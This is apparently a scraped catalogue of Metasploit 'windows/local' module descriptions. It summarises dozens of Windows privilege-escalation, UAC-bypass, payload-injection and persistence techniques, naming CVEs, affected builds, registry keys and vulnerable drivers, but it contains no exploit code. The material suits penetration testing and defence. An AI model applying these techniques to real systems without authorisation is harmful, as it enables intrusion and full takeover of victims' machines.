There exists a privilege escalation vulnerability for Windows 10 builds prior to build 17763. Due to the AppXSvc's improper handling of hard links, a user can gain full privileges over a SYSTEM-owned file. The user can then utilize the new file to execute code as SYSTEM. This module employs a technique using the Diagnostics Hub Standard Collector Service (DiagHub) which was discovered by James Forshaw to load and execute a DLL as SYSTEM.

windows/local/ask
This module will attempt to elevate execution level using the ShellExecute undocumented RunAs flag to bypass low UAC settings.

windows/local/bits_ntlm_token_impersonation
This module exploit BITS behavior which tries to connect to the local Windows Remote Management server (WinRM) every times it starts. The module launches a fake WinRM server which listen on port 5985 and triggers BITS. When BITS starts, it tries to authenticate to the Rogue WinRM server, which allows to steal a SYSTEM token. This token is then used to launch a new process as SYSTEM user. In the case of this exploit, notepad.exe is launched as SYSTEM. Then, it write shellcode in its previous memory space and trigger its execution. As this exploit uses reflective dll injection, it does not write any file on the disk. See /documentation/modules/exploit/windows/local/bits_ntlm_token_impersonation.md for complementary words of information. Vulnerable operating systems are Windows 10 and Windows servers where WinRM is not running. Lab experiments has shown that Windows 7 does not exhibit the vulnerable behavior. WARNING: - As this exploit runs a service on the target (Fake WinRM on port 5985), a firewall popup may appear on target screen. Thus, this exploit may not be completely silent. - This exploit has been successfully tested on : Windows 10 (10.0 Build 19041) 32 bits Windows 10 Pro, Version 1903 (10.0 Build 18362) 64 bits - This exploit failed because of no BITS authentication attempt on: Windows 7 (6.1 Build 7601, Service Pack 1) 32 bits - Windows servers are not vulnerable because a genuine WinRM service is already running, except if the user has disabled it (Or if this exploit succeed to terminate it). - SE_IMPERSONATE_NAME or SE_ASSIGNPRIMARYTOKEN_NAME privs are required. - BITS must not be running. - This exploit automatically perform above quoted checks. run "check" command to run checklist.

windows/local/bthpan
A vulnerability within Microsoft Bluetooth Personal Area Networking module, BthPan.sys, can allow an attacker to inject memory controlled by the attacker into an arbitrary location. This can be used by an attacker to overwrite HalDispatchTable+0x4 and execute arbitrary code by subsequently calling NtQueryIntervalProfile.

windows/local/bypassuac
This module will bypass Windows UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off.

windows/local/bypassuac_comhijack
This module will bypass Windows UAC by creating COM handler registry entries in the HKCU hive. When certain high integrity processes are loaded, these registry entries are referenced resulting in the process loading user-controlled DLLs. These DLLs contain the payloads that result in elevated sessions. Registry key modifications are cleaned up after payload invocation. This module requires the architecture of the payload to match the OS, but the current low-privilege Meterpreter session architecture can be different. If specifying EXE::Custom your DLL should call ExitProcess() after starting your payload in a separate process. This module invokes the target binary via cmd.exe on the target. Therefore if cmd.exe access is restricted, this module will not run correctly.

windows/local/bypassuac_dotnet_profiler
Microsoft Windows allows for the automatic loading of a profiling COM object during the launch of a CLR process based on certain environment variables ostensibly to monitor execution. In this case, we abuse the profiler by pointing to a payload DLL that will be launched as the profiling thread. This thread will run at the permission level of the calling process, so an auto-elevating process will launch the DLL with elevated permissions. In this case, we use gpedit.msc as the auto-elevated CLR process, but others would work, too.

windows/local/bypassuac_eventvwr
This module will bypass Windows UAC by hijacking a special key in the Registry under the current user hive, and inserting a custom command that will get invoked when the Windows Event Viewer is launched. It will spawn a second shell that has the UAC flag turned off. This module modifies a registry key, but cleans up the key once the payload has been invoked. The module does not require the architecture of the payload to match the OS. If specifying EXE::Custom your DLL should call ExitProcess() after starting your payload in a separate process.

windows/local/bypassuac_fodhelper
This module will bypass Windows 10 UAC by hijacking a special key in the Registry under the current user hive, and inserting a custom command that will get invoked when the Windows fodhelper.exe application is launched. It will spawn a second shell that has the UAC flag turned off. This module modifies a registry key, but cleans up the key once the payload has been invoked. The module does not require the architecture of the payload to match the OS. If specifying EXE::Custom your DLL should call ExitProcess() after starting your payload in a separate process.

windows/local/bypassuac_injection
This module will bypass Windows UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off. This module uses the Reflective DLL Injection technique to drop only the DLL payload binary instead of three separate binaries in the standard technique. However, it requires the correct architecture to be selected, (use x64 for SYSWOW64 systems also). If specifying EXE::Custom your DLL should call ExitProcess() after starting your payload in a separate process.

windows/local/bypassuac_injection_winsxs
This module will bypass Windows UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off by abusing the way "WinSxS" works in Windows systems. This module uses the Reflective DLL Injection technique to drop only the DLL payload binary instead of three seperate binaries in the standard technique. However, it requires the correct architecture to be selected, (use x64 for SYSWOW64 systems also).

windows/local/bypassuac_sdclt
This module will bypass Windows UAC by hijacking a special key in the Registry under the current user hive, and inserting a custom command that will get invoked when Window backup and restore is launched. It will spawn a second shell that has the UAC flag turned off. This module modifies a registry key, but cleans up the key once the payload has been invoked.

windows/local/bypassuac_silentcleanup
There's a task in Windows Task Scheduler called "SilentCleanup" which, while it's executed as Users, automatically runs with elevated privileges. When it runs, it executes the file %windir%\system32\cleanmgr.exe. Since it runs as Users, and we can control user's environment variables, %windir% (normally pointing to C:\Windows) can be changed to point to whatever we want, and it'll run as admin.

windows/local/bypassuac_sluihijack
This module will bypass UAC on Windows 8-10 by hijacking a special key in the Registry under the Current User hive, and inserting a custom command that will get invoked when any binary (.exe) application is launched. But slui.exe is an auto-elevated binary that is vulnerable to file handler hijacking. When we run slui.exe with changed Registry key (HKCU:\Software\Classes\exefile\shell\open\command), it will run our custom command as Admin instead of slui.exe. The module modifies the registry in order for this exploit to work. The modification is reverted once the exploitation attempt has finished. The module does not require the architecture of the payload to match the OS. If specifying EXE::Custom your DLL should call ExitProcess() after starting the payload in a different process.

windows/local/bypassuac_vbs
This module will bypass Windows UAC by utilizing the missing .manifest on the script host cscript/wscript.exe binaries.

windows/local/bypassuac_windows_store_filesys
This module exploits a flaw in the WSReset.exe Windows Store Reset Tool. The tool is run with the "autoElevate" property set to true, however it can be moved to a new Windows directory containing a space (C:\Windows \System32\) where, upon execution, it will load our payload dll (propsys.dll).

windows/local/bypassuac_windows_store_reg
This module exploits a flaw in the WSReset.exe file associated with the Windows Store. This binary has autoelevate privs, and it will run a binary file contained in a low-privilege registry location. By placing a link to the binary in the registry location, WSReset.exe will launch the binary as a privileged user.

windows/local/canon_driver_privesc
Canon TR150 print drivers versions 3.71.2.10 and below allow local users to read/write files within the "CanonBJ" directory and its subdirectories. By overwriting the DLL at C:\ProgramData\CanonBJ\IJPrinter\CNMWINDOWS\Canon TR150 series\LanguageModules\040C\CNMurGE.dll with a malicious DLL at the right time whilst running the C:\Windows\System32\Printing_Admin_Scripts\en-US\prnmngr.vbs script to install a new printer, a timing issue can be exploited to cause the PrintIsolationHost.exe program, which runs as NT AUTHORITY\SYSTEM, to successfully load the malicious DLL. Successful exploitation will grant attackers code execution as the NT AUTHORITY\SYSTEM user. This module leverages the prnmngr.vbs script to add and delete printers. Multiple runs of this module may be required given successful exploitation is time-sensitive.

windows/local/capcom_sys_exec
This module abuses the Capcom.sys kernel driver's function that allows for an arbitrary function to be executed in the kernel from user land. This function purposely disables SMEP prior to invoking a function given by the caller. This has been tested on Windows 7, 8.1, 10 (x64) and Windows 11 (x64) upto build 22000.194. Note that builds after 22000.194 contain deny lists that prevent this driver from loading.

windows/local/comahawk
This exploit uses two vulnerabilities to execute a command as an elevated user. The first (CVE-2019-1405) uses the UPnP Device Host Service to elevate to NT AUTHORITY\LOCAL SERVICE The second (CVE-2019-1322) leverages the Update Orchestrator Service to elevate from NT AUTHORITY\LOCAL SERVICE to NT AUTHORITY\SYSTEM.

windows/local/current_user_psexec
This module uploads an executable file to the victim system, creates a share containing that executable, creates a remote service on each target system using a UNC path to that file, and finally starts the service(s). The result is similar to psexec but with the added benefit of using the session's current authentication token instead of having to know a password or hash.

windows/local/cve_2017_8464_lnk_lpe
This module exploits a vulnerability in the handling of Windows Shortcut files (.LNK) that contain a dynamic icon, loaded from a malicious DLL. This vulnerability is a variant of MS15-020 (CVE-2015-0096). The created LNK file is similar except an additional SpecialFolderDataBlock is included. The folder ID set in this SpecialFolderDataBlock is set to the Control Panel. This is enough to bypass the CPL whitelist. This bypass can be used to trick Windows into loading an arbitrary DLL file. The PATH option must be an absolute path to a writeable directory which is indexed for searching. If no PATH is specified, the module defaults to %USERPROFILE%.

windows/local/cve_2018_8453_win32k_priv_esc
An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory, aka "Win32k Elevation of Privilege Vulnerability." This affects Windows 7, Windows Server 2012 R2, Windows RT 8.1, Windows Server 2008, Windows Server 2019, Windows Server 2012, Windows 8.1, Windows Server 2016, Windows Server 2008 R2, Windows 10, Windows 10 Servers. This module is tested against Windows 10 v1703 x86.

windows/local/cve_2019_1458_wizardopium
This module exploits CVE-2019-1458, an arbitrary pointer dereference vulnerability within win32k which occurs due to an uninitalized variable, which allows user mode attackers to write a limited amount of controlled data to an attacker controlled address in kernel memory. By utilizing this vulnerability to execute controlled writes to kernel memory, an attacker can gain arbitrary code execution as the SYSTEM user. This module has been tested against Windows 7 x64 SP1. Offsets within the exploit code may need to be adjusted to work with other versions of Windows. The exploit can only be triggered once against the target and can cause the target machine to reboot when the session is terminated.

windows/local/cve_2020_0668_service_tracing
This module leverages a trusted file overwrite with a DLL hijacking vulnerability to gain SYSTEM-level access on vulnerable Windows 10 x64 targets.

windows/local/cve_2020_0787_bits_arbitrary_file_move
This module exploits CVE-2020-0787, an arbitrary file move vulnerability in outdated versions of the Background Intelligent Transfer Service (BITS), to overwrite C:\Windows\System32\WindowsCoreDeviceInfo.dll with a malicious DLL containing the attacker's payload. To achieve code execution as the SYSTEM user, the Update Session Orchestrator service is then started, which will result in the malicious WindowsCoreDeviceInfo.dll being run with SYSTEM privileges due to a DLL hijacking issue within the Update Session Orchestrator Service. Note that presently this module only works on Windows 10 and Windows Server 2016 and later as the Update Session Orchestrator Service was only introduced in Windows 10. Note that only Windows 10 has been tested, so your mileage may vary on Windows Server 2016 and later.

windows/local/cve_2020_0796_smbghost
A vulnerability exists within the Microsoft Server Message Block 3.1.1 (SMBv3) protocol that can be leveraged to execute code on a vulnerable server. This local exploit implementation leverages this flaw to elevate itself before injecting a payload into winlogon.exe.

windows/local/cve_2020_1048_printerdemon
This exploit leverages a file write vulnerability in the print spooler service which will restart if stopped. Because the service cannot be stopped long enough to remove the dll, there is no way to remove the dll once it is loaded by the service. Essentially, on default settings, this module adds a permanent elevated backdoor.

windows/local/cve_2020_1054_drawiconex_lpe
This module exploits CVE-2020-1054, an out of bounds write reachable from DrawIconEx within win32k. The out of bounds write can be used to overwrite the pvbits of a SURFOBJ. By utilizing this vulnerability to execute controlled writes to kernel memory, an attacker can gain arbitrary code execution as the SYSTEM user. This module has been tested against a fully updated Windows 7 x64 SP1. Offsets within the exploit code may need to be adjusted to work with other versions of Windows.

windows/local/cve_2020_1313_system_orchestrator
This exploit uses access to the UniversalOrchestrator ScheduleWork API call which does not verify the caller's token before scheduling a job to be run as SYSTEM. You cannot schedule something in a given time, so the payload will execute as system sometime in the next 24 hours.

windows/local/cve_2020_1337_printerdemon
This exploit leverages a file write vulnerability in the print spooler service which will restart if stopped. Because the service cannot be stopped long enough to remove the dll, there is no way to remove the dll once it is loaded by the service. Essentially, on default settings, this module adds a permanent elevated backdoor.

windows/local/cve_2020_17136
The Cloud Filter driver, cldflt.sys, on Windows 10 v1803 and later, prior to the December 2020 updates, did not set the IO_FORCE_ACCESS_CHECK or OBJ_FORCE_ACCESS_CHECK flags when calling FltCreateFileEx() and FltCreateFileEx2() within its HsmpOpCreatePlaceholders() function with attacker controlled input. This meant that files were created with KernelMode permissions, thereby bypassing any security checks that would otherwise prevent a normal user from being able to create files in directories they don't have permissions to create files in. This module abuses this vulnerability to perform a DLL hijacking attack against the Microsoft Storage Spaces SMP service, which grants the attacker code execution as the NETWORK SERVICE user. Users are strongly encouraged to set the PAYLOAD option to one of the Meterpreter payloads, as doing so will allow them to subsequently escalate their new session from NETWORK SERVICE to SYSTEM by using Meterpreter's "getsystem" command to perform RPCSS Named Pipe Impersonation and impersonate the SYSTEM user.

windows/local/cve_2021_21551_dbutil_memmove
The DBUtil_2_3.sys driver distributed by Dell exposes an unprotected IOCTL interface that can be abused by an attacker read and write kernel-mode memory.

windows/local/cve_2021_40449
A use after free vulnerability exists in the `NtGdiResetDC()` function of Win32k which can be leveraged by an attacker to escalate privileges to those of `NT AUTHORITY\SYSTEM`. The flaw exists due to the fact that this function calls `hdcOpenDCW()`, which performs a user mode callback. During this callback, attackers can call the `NtGdiResetDC()` function again with the same handle as before, which will result in the PDC object that is referenced by this handle being freed. The attacker can then replace the memory referenced by the handle with their own object, before passing execution back to the original `NtGdiResetDC()` call, which will now use the attacker's object without appropriate validation. This can then allow the attacker to manipulate the state of the kernel and, together with additional exploitation techniques, gain code execution as NT AUTHORITY\SYSTEM. This module has been tested to work on Windows 10 x64 RS1 (build 14393) and RS5 (build 17763), however previous versions of Windows 10 will likely also work.

windows/local/cve_2022_21882_win32k
A vulnerability exists within win32k that can be leveraged by an attacker to escalate privileges to those of NT AUTHORITY\SYSTEM. The flaw exists in how the WndExtra field of a window can be manipulated into being treated as an offset despite being populated by an attacker-controlled value. This can be leveraged to achieve an out of bounds write operation, eventually leading to privilege escalation. This flaw was originally identified as CVE-2021-1732 and was patched by Microsoft on February 9th, 2021. In early 2022, a technique to bypass the patch was identified and assigned CVE-2022-21882. The root cause is is the same for both vulnerabilities. This exploit combines the patch bypass with the original exploit to function on a wider range of Windows 10 targets.

windows/local/cve_2022_21999_spoolfool_privesc
The Windows Print Spooler has a privilege escalation vulnerability that can be leveraged to achieve code execution as SYSTEM. The `SpoolDirectory`, a configuration setting that holds the path that a printer's spooled jobs are sent to, is writable for all users, and it can be configured via `SetPrinterDataEx()` provided the caller has the `PRINTER_ACCESS_ADMINISTER` permission. If the `SpoolDirectory` path does not exist, it will be created once the print spooler reinitializes. Calling `SetPrinterDataEx()` with the `CopyFiles\` registry key will load the dll passed in as the `pData` argument, meaning that writing a dll to the `SpoolDirectory` location can be loaded by the print spooler. Using a directory junction and UNC path for the `SpoolDirectory`, the exploit writes a payload to `C:\Windows\System32\spool\drivers\x64\4` and loads it by calling `SetPrinterDataEx()`, resulting in code execution as SYSTEM.

windows/local/cve_2022_26904_superprofile
The user profile service, identified as ProfSrv, is vulnerable to a local privilege elevation vulnerability in its CreateDirectoryJunction() function due to a lack of appropriate checks on the directory structure of the junctions it tries to link together. Attackers can leverage this vulnerability to plant a malicious DLL in a system directory and then trigger a UAC prompt to cause this DLL to be loaded and executed by ProfSrv as the NT AUTHORITY\SYSTEM user. Note that this bug was originally identified as CVE-2021-34484 and was subsequently patched a second time as CVE-2022-21919, however both patches were found to be insufficient. This bug is a patch bypass for CVE-2022-21919 and at the time of publishing, has not yet been patched, though plans are in place to patch it as CVE-2022-26904. It is important to note that the credentials supplied for the second user to log in as in this exploit must be those of a normal non-admin user and these credentials must also corralate with a user who has already logged in at least once before. Additionally the current user running the exploit must have UAC set to the highest level, aka "Always Notify Me When", in order for the code to be executed as NT AUTHORITY\SYSTEM. Note however that "Always Notify Me When" is the default UAC setting on common Windows installs, so this would only affect instances where this setting has been changed either manually or as part of the installation process.

windows/local/cve_2022_3699_lenovo_diagnostics_driver
Incorrect access control for the Lenovo Diagnostics Driver allows a low-privileged user the ability to issue device IOCTLs to perform arbitrary physical/virtual memory read/write.

windows/local/cve_2023_21768_afd_lpe
A vulnerability exists in the Windows Ancillary Function Driver for Winsock (`afd.sys`) can be leveraged by an attacker to escalate privileges to those of NT AUTHORITY\SYSTEM. Due to a flaw in `AfdNotifyRemoveIoCompletion`, it is possible to create an arbitrary kernel Write-Where primitive, which can be used to manipulate internal I/O ring structures and achieve local privilege escalation. This exploit only supports Windows 11 22H2 up to build 22621.963 (patched in January 2023 updates).

windows/local/cve_2023_28252_clfs_driver
A privilege escalation vulnerability exists in the clfs.sys driver which comes installed by default on Windows 10 21H2, Windows 11 21H2 and Windows Server 20348 operating systems. The clfs.sys driver contains a function CreateLogFile that is used to create open and edit '*.blf' (base log format) files. Inside a .blf file there are multiple blocks of data which contain checksums to verify the integrity of the .blf file and to ensure the file looks and acts like a .blf file. However, these files can be edited with CreateFileA or with fopen and then modified with WriteFile or fwrite respectively in order to change the contents of the file and update their checksums accordingly. This exploit makes use to two different kinds of specially crafted .blf files that are edited using the technique mentioned above. There are multiple spray .blf files. The spray .blf files are specially crafted to initiate an out of bounds read which reads from a contiguous block of memory. The block of memory it reads from contains a read-write pipe that points to the address of the second type of .blf file - the trigger .blf file. The trigger .blf file is specially crafted read the SYSTEM token and write it in the process of the exploit to achieve the local privilege escalation. The exploits creates a controlled memory space by first looping over the CreatePipe function to to create thousands of read-write pipes (which take up 0x90 bytes of memory). It then releases a certain number of pipes from memory and calls CreateLogFile to open the pre-existing spray .blf files which when being opened fill the 0x90 byte gaps created by the deallocation of the pipes in memory, creating the controlled memory space. This is a very brief and high overview description of what the exploit is actually doing. For a more detailed and in depth analysis please refer to the following [reference](https://github.com/fortra/CVE-2023-28252).

windows/local/dnsadmin_serverlevelplugindll
This module exploits a feature in the DNS service of Windows Server. Users of the DnsAdmins group can set the `ServerLevelPluginDll` value using dnscmd.exe to create a registry key at `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\` named `ServerLevelPluginDll` that can be made to point to an arbitrary DLL. After doing so, restarting the service will load the DLL and cause it to execute, providing us with SYSTEM privileges. Increasing WfsDelay is recommended when using a UNC path. Users should note that if the DLLPath variable of this module is set to a UNC share that does not exist, the DNS server on the target will not be able to restart. Similarly if a UNC share is not utilized, and users instead opt to drop a file onto the disk of the target computer, and this gets picked up by Anti-Virus after the timeout specified by `AVTIMEOUT` expires, its possible that the `ServerLevelPluginDll` value of the `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\` key on the target computer may point to an nonexistant DLL, which will also prevent the DNS server from being able to restart. Users are advised to refer to the documentation for this module for advice on how to resolve this issue should it occur. This module has only been tested and confirmed to work on Windows Server 2019 Standard Edition, however it should work against any Windows Server version up to and including Windows Server 2019.

windows/local/docker_credential_wincred
This exploit leverages a vulnerability in docker desktop community editions prior to 2.1.0.1 where an attacker can write a payload to a lower-privileged area to be executed automatically by the docker user at login.

windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc
Druva inSync client for Windows exposes a network service on TCP port 6064 on the local network interface. inSync versions 6.6.3 and prior do not properly validate user-supplied program paths in RPC type 5 messages, allowing execution of arbitrary commands as SYSTEM. This module has been tested successfully on inSync versions 6.5.2r99097 and 6.6.3r102156 on Windows 7 SP1 (x64).

windows/local/gog_galaxyclientservice_privesc
This module will send arbitrary file_paths to the GOG GalaxyClientService, which will be executed with SYSTEM privileges (verified on GOG Galaxy Client v1.2.62 and v2.0.12; prior versions are also likely affected).

windows/local/ikeext_service
This module exploits a missing DLL loaded by the 'IKE and AuthIP Keyring Modules' (IKEEXT) service which runs as SYSTEM, and starts automatically in default installations of Vista-Win8. It requires an insecure bin path to plant the DLL payload.

windows/local/ipass_launch_app
The named pipe, \IPEFSYSPCPIPE, can be accessed by normal users to interact with the iPass service. The service provides a LaunchAppSysMode command which allows to execute arbitrary commands as SYSTEM.

windows/local/lenovo_systemupdate
The named pipe, \SUPipeServer, can be accessed by normal users to interact with the System update service. The service provides the possibility to execute arbitrary commands as SYSTEM if a valid security token is provided. This token can be generated by calling the GetSystemInfoData function in the DLL tvsutil.dll. Please, note that the System Update is stopped by default but can be started/stopped calling the Executable ConfigService.exe.

windows/local/lexmark_driver_privesc
Various Lexmark Universal Printer drivers as listed at advisory TE953 allow low-privileged authenicated users to elevate their privileges to SYSTEM on affected Windows systems by modifying the XML file at C:\ProgramData\<driver name>\Universal Color Laser.gdl to replace the DLL path to unires.dll with a malicious DLL path. When C:\Windows\System32\Printing_Admin_Scripts\en-US\prnmngr.vbs is then used to add the printer to the affected system, PrintIsolationHost.exe, a Windows process running as NT AUTHORITY\SYSTEM, will inspect the C:\ProgramData\<driver name>\Universal Color Laser.gdl file and will load the malicious DLL from the path specified in the file. This which will result in the malicious DLL executing as NT AUTHORITY\SYSTEM. Once this module is finished, it will use the prnmngr.vbs script to remove the printer it added.

windows/local/microfocus_operations_privesc
This module exploits an incorrectly permissioned folder in Micro Focus Operations Bridge Manager and Operations Bridge Reporter. An unprivileged user (such as Guest) can drop a JSP file in an exploded WAR directory and then access it without authentication by making a request to the OBM / OBR server. This will result in automatic code execution as SYSTEM. This module has been tested on OBM 2020.05 and OBR 10.40, but it should work out of the box on earlier versions too. Note that it is only exploitable on Windows installations.

windows/local/mov_ss
This module exploits a vulnerability in a statement in the system programming guide of the Intel 64 and IA-32 architectures software developer's manual being mishandled in various operating system kerneles, resulting in unexpected behavior for #DB excpetions that are deferred by MOV SS or POP SS. This module will upload the pre-compiled exploit and use it to execute the final payload in order to gain remote code execution.

windows/local/mqac_write
A vulnerability within the MQAC.sys module allows an attacker to overwrite an arbitrary location in kernel memory. This module will elevate itself to SYSTEM, then inject the payload into another SYSTEM process.

windows/local/ms10_015_kitrap0d
This module will create a new session with SYSTEM privileges via the KiTrap0D exploit by Tavis Ormandy. If the session in use is already elevated then the exploit will not run. The module relies on kitrap0d.x86.dll, and is not supported on x64 editions of Windows.

windows/local/ms10_092_schelevator
This module exploits the Task Scheduler 2.0 XML 0day exploited by Stuxnet. When processing task files, the Windows Task Scheduler only uses a CRC32 checksum to validate that the file has not been tampered with. Also, In a default configuration, normal users can read and write the task files that they have created. By modifying the task file and creating a CRC32 collision, an attacker can execute arbitrary commands with SYSTEM privileges. NOTE: Thanks to webDEViL for the information about disable/enable.

windows/local/ms11_080_afdjoinleaf
This module exploits a flaw in the AfdJoinLeaf function of the afd.sys driver to overwrite data in kernel space. An address within the HalDispatchTable is overwritten and when triggered with a call to NtQueryIntervalProfile will execute shellcode. This module will elevate itself to SYSTEM, then inject the payload into another SYSTEM process before restoring its own token to avoid causing system instability.

windows/local/ms13_005_hwnd_broadcast
Due to a problem with isolating window broadcast messages in the Windows kernel, an attacker can broadcast commands from a lower Integrity Level process to a higher Integrity Level process, thereby effecting a privilege escalation. This issue affects Windows Vista, 7, 8, Server 2008, Server 2008 R2, Server 2012, and RT. Note that spawning a command prompt with the shortcut key combination Win+Shift+# does not work in Vista, so the attacker will have to check if the user is already running a command prompt and set SPAWN_PROMPT false. Three exploit techniques are available with this module. The WEB technique will execute a powershell encoded payload from a Web location. The FILE technique will drop an executable to the file system, set it to medium integrity and execute it. The TYPE technique will attempt to execute a powershell encoded payload directly from the command line, but may take some time to complete.

windows/local/ms13_053_schlamperei
This module leverages a kernel pool overflow in Win32k which allows local privilege escalation. The kernel shellcode nulls the ACL for the winlogon.exe process (a SYSTEM process). This allows any unprivileged process to freely migrate to winlogon.exe, achieving privilege escalation. This exploit was used in pwn2own 2013 by MWR to break out of chrome's sandbox. NOTE: when a meterpreter session started by this exploit exits, winlogin.exe is likely to crash.

windows/local/ms13_081_track_popup_menu
This module exploits a vulnerability in win32k.sys where under specific conditions TrackPopupMenuEx will pass a NULL pointer to the MNEndMenuState procedure. This module has been tested successfully on Windows 7 SP0 and Windows 7 SP1.

windows/local/ms13_097_ie_registry_symlink
This module exploits a vulnerability in Internet Explorer Sandbox which allows to escape the Enhanced Protected Mode and execute code with Medium Integrity. The vulnerability exists in the IESetProtectedModeRegKeyOnly function from the ieframe.dll component, which can be abused to force medium integrity IE to user influenced keys. By using registry symlinks it's possible force IE to add a policy entry in the registry and finally bypass Enhanced Protected Mode.

windows/local/ms14_009_ie_dfsvc
This module abuses a process creation policy in Internet Explorer's sandbox, specifically in the .NET Deployment Service (dfsvc.exe), which allows the attacker to escape the Enhanced Protected Mode, and execute code with Medium Integrity.

windows/local/ms14_058_track_popup_menu
This module exploits a NULL Pointer Dereference in win32k.sys, the vulnerability can be triggered through the use of TrackPopupMenu. Under special conditions, the NULL pointer dereference can be abused on xxxSendMessageTimeout to achieve arbitrary code execution. This module has been tested successfully on Windows XP SP3, Windows 2003 SP2, Windows 7 SP1 and Windows 2008 32bits. Also on Windows 7 SP1 and Windows 2008 R2 SP1 64 bits.

windows/local/ms14_070_tcpip_ioctl
A vulnerability within the Microsoft TCP/IP protocol driver tcpip.sys can allow a local attacker to trigger a NULL pointer dereference by using a specially crafted IOCTL. This flaw can be abused to elevate privileges to SYSTEM.

windows/local/ms15_004_tswbproxy
This module abuses a process creation policy in Internet Explorer's sandbox; specifically, Microsoft's RemoteApp and Desktop Connections runtime proxy, TSWbPrxy.exe. This vulnerability allows the attacker to escape the Protected Mode and execute code with Medium Integrity. At the moment, this module only bypass Protected Mode on Windows 7 SP1 and prior (32 bits). This module has been tested successfully on Windows 7 SP1 (32 bits) with IE 8 and IE 11.

windows/local/ms15_051_client_copy_image

windows/local/ms16_014_wmi_recv_notif
This module exploits an uninitialized stack variable in the WMI subsystem of ntoskrnl. This module has been tested on vulnerable builds of Windows 7 SP0 x64 and Windows 7 SP1 x64.

windows/local/ms16_016_webdav
This module exploits the vulnerability in mrxdav.sys described by MS16-016. The module will spawn a process on the target system and elevate its privileges to NT AUTHORITY\SYSTEM before executing the specified payload within the context of the elevated process.

windows/local/ms16_032_secondary_logon_handle_privesc
This module exploits the lack of sanitization of standard handles in Windows' Secondary Logon Service. The vulnerability is known to affect versions of Windows 7-10 and 2k8-2k12 32 and 64 bit. This module will only work against those versions of Windows with Powershell 2.0 or later and systems with two or more CPU cores.

windows/local/ms16_075_reflection
Module utilizes the Net-NTLMv2 reflection between DCOM/RPC to achieve a SYSTEM handle for elevation of privilege. Currently the module does not spawn as SYSTEM, however once achieving a shell, one can easily use incognito to impersonate the token.

windows/local/ms16_075_reflection_juicy
This module utilizes the Net-NTLMv2 reflection between DCOM/RPC to achieve a SYSTEM handle for elevation of privilege. It requires a CLSID string. Windows 10 after version 1803, (April 2018 update, build 17134) and all versions of Windows Server 2019 are not vulnerable.

windows/local/ms18_8120_win32k_privesc
This module exploits elevation of privilege vulnerability that exists in Windows 7 and 2008 R2 when the Win32k component fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. This module is tested against windows 7 x86, windows 7 x64 and windows server 2008 R2 standard x64.

windows/local/ms_ndproxy
This module exploits a flaw in the ndproxy.sys driver on Windows XP SP3 and Windows 2003 SP2 systems, exploited in the wild in November, 2013. The vulnerability exists while processing an IO Control Code 0x8fff23c8 or 0x8fff23cc, where user provided input is used to access an array unsafely, and the value is used to perform a call, leading to a NULL pointer dereference which is exploitable on both Windows XP and Windows 2003 systems. This module has been tested successfully on Windows XP SP3 and Windows 2003 SP2. In order to work the service "Routing and Remote Access" must be running on the target system.

windows/local/novell_client_nicm
This module exploits a flaw in the nicm.sys driver to execute arbitrary code in kernel space. The vulnerability occurs while handling ioctl requests with code 0x143B6B, where a user provided pointer is used as function pointer. The module has been tested successfully on Windows 7 SP1 with Novell Client 2 SP3.

windows/local/novell_client_nwfs
This module exploits a flaw in the nwfs.sys driver to overwrite data in kernel space. The corruption occurs while handling ioctl requests with code 0x1438BB, where a 0x00000009 dword is written to an arbitrary address. An entry within the HalDispatchTable is overwritten in order to execute arbitrary code when NtQueryIntervalProfile is called. The module has been tested successfully on Windows XP SP3 with Novell Client 4.91 SP4.

windows/local/nscp_pe
This module allows an attacker with an unprivileged windows account to gain admin access on windows system and start a shell. For this module to work, both the NSClient++ web interface and `ExternalScripts` features must be enabled. You must also know where the NSClient config file is, as it is used to read the admin password which is stored in clear text.

windows/local/ntapphelpcachecontrol
On Windows, the system call NtApphelpCacheControl (the code is actually in ahcache.sys) allows application compatibility data to be cached for quick reuse when new processes are created. A normal user can query the cache but cannot add new cached entries as the operation is restricted to administrators. This is checked in the function AhcVerifyAdminContext. This function has a vulnerability where it doesn't correctly check the impersonation token of the caller to determine if the user is an administrator. It reads the caller's impersonation token using PsReferenceImpersonationToken and then does a comparison between the user SID in the token to LocalSystem's SID. It doesn't check the impersonation level of the token so it's possible to get an identify token on your thread from a local system process and bypass this check. This module currently only affects Windows 8 and Windows 8.1, and requires access to C:\Windows\System\ComputerDefaults.exe (although this can be improved).

windows/local/ntusermndragover
This module exploits a NULL pointer dereference vulnerability in MNGetpItemFromIndex(), which is reachable via a NtUserMNDragOver() system call. The NULL pointer dereference occurs because the xxxMNFindWindowFromPoint() function does not effectively check the validity of the tagPOPUPMENU objects it processes before passing them on to MNGetpItemFromIndex(), where the NULL pointer dereference will occur. This module has been tested against Windows 7 x86 SP0 and SP1. Offsets within the solution may need to be adjusted to work with other versions of Windows, such as Windows Server 2008.

windows/local/nvidia_nvsvc
The named pipe, \pipe\nsvr, has a NULL DACL allowing any authenticated user to interact with the service. It contains a stacked based buffer overflow as a result of a memmove operation. Note the slight spelling differences: the executable is 'nvvsvc.exe', the service name is 'nvsvc', and the named pipe is 'nsvr'. This exploit automatically targets nvvsvc.exe versions dated Nov 3 2011, Aug 30 2012, and Dec 1 2012. It has been tested on Windows 7 64-bit against nvvsvc.exe dated Dec 1 2012.

windows/local/panda_psevents
PSEvents.exe within several Panda Security products runs hourly with SYSTEM privileges. When run, it checks a user writable folder for certain DLL files, and if any are found they are automatically run. Vulnerable Products: Panda Global Protection 2016 (<=16.1.2) Panda Antivirus Pro 2016 (<=16.1.2) Panda Small Business Protection (<=16.1.2) Panda Internet Security 2016 (<=16.1.2)

windows/local/payload_inject
This module will inject a payload into memory of a process. If a payload isn't selected, then it'll default to a reverse x86 TCP meterpreter. If the PID datastore option isn't specified, then it'll inject into notepad.exe instead.

windows/local/persistence
This module will install a payload that is executed during boot. It will be executed either at user logon or system startup via the registry value in "CurrentVersion\Run" (depending on privilege and selected method).

windows/local/persistence_image_exec_options
